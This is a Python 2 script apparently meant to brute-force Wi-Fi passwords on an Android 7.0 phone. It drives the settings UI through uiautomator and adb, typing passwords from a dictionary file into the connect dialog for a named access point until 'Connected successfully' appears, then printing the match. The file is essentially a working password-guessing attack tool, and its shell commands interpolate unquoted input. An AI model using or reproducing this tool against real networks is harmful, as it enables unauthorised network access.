# -*-coding=utf-8-*-
__author__ = 'Rocky'
#目前只适用于android 7.0 系统
from uiautomator import device as d
import subprocess,time,subprocess
class CrashWIFI():

    def cmd(self,cmd_line):
        p=subprocess.Popen(cmd_line,stdout=subprocess.PIPE,shell=True)
        p.communicate()

    def crash_wifi_android_n(self,ap,dict_file):
        f=open(dict_file,'r')
        count=0
        while 1:
            pwd=f.readline().strip()
            if not pwd:
                print "END of Password, no password found in the dictionary"
                break
            result=self.crash(count,ap,pwd)
            if result:
                break
            count=count+1

    def crash(self,count,ap,passwd):
        print "WIFI connect in LOOP %d" % count
        # get_log(count)
        d.press.home()
        d.press.down()
        d.press.down()
        d.press.down()

        d.press.right()
        d.press.right()
        #d.press.right()
        # d.press.right()

        d.press.enter()
        time.sleep(3)
        d.press.enter()
        time.sleep(3)
        d.press.down()
        d.press.down()
        d.press.down()
        d.press.down()
        d.press.down()

        d.press.enter()
        time.sleep(2)
        cmd = 'adb shell input text %s' % ap
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        cmd = 'adb shell input keyevent KEYCODE_ESCAPE'
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        time.sleep(1)
        d.press.enter()
        time.sleep(1)

        # d.press.enter()

        d.press.down()
        d.press.down()
        d.press.enter()
        cmd = 'adb shell input text %s' % passwd
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        cmd = 'adb shell input keyevent KEYCODE_ESCAPE'
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        time.sleep(1)
        d.press.enter()
        def_timeout=15
        if d(text="Connected successfully").wait.exists(timeout=def_timeout * 1000) == True:
            print "connected successfully"
            print "password is ", passwd
            return 1
        else:
            return 0


    def crack_cuizhi(self,username,password):
        print d.info
        d.press.home()
        d(textContains=u'Settings').click()
        time.sleep(3)
        d(text=u'无线网络').click()
        time.sleep(5)
        d(text=u'手动添加网络').click()
        username='adb shell input text %s' %username
        self.cmd(username)
        time.sleep(5)
        d(text=u'安全性').click()
        time.sleep(3)
        d(text=u'WPA/WPA2 PSK').click()
        d.press.down()
        d.press.down()
        d.press.down()

    def test_case(self):
        d.press.down()
        print "Done"
        d.press.down()
        d.press.down()
        d.press.down()
        d.press.down()
        d(text=u'无线网络').click()
        d.dump('hierarchy.xml')
        xml=d.dump()
        print type(xml)
if __name__=='__main__':
    obj=CrashWIFI()
    #obj.crash_wifi_android_n('xiaomi2g','password.txt')
    #obj.crack_cuizhi('hello','')
    obj.test_case()